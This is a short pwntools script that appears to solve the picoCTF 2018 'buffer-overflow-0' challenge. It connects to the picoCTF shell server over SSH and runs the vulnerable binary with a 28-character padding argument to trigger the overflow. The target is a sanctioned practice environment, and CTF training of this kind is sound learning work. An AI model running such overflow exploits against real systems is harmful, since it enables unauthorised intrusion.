#!/usr/bin/python
from pwn import *

USER = 'zyazhb' # Change username accordingly.
PASSWORD = '******'
s = ssh(host='2018shell1.picoctf.com', user=USER, password=PASSWORD)

exploit = 'A' * 28

#py = s.run('cd /problems/buffer-overflow-0_2_aab3d2a22456675a9f9c29783b256a3d; ./vuln {}'.format(exploit))
py = s.run('cd /problems/buffer-overflow-0_1_316c391426b9319fbdfb523ee15b37db; ./vuln {}'.format(exploit))
print py.recv()
s.close()
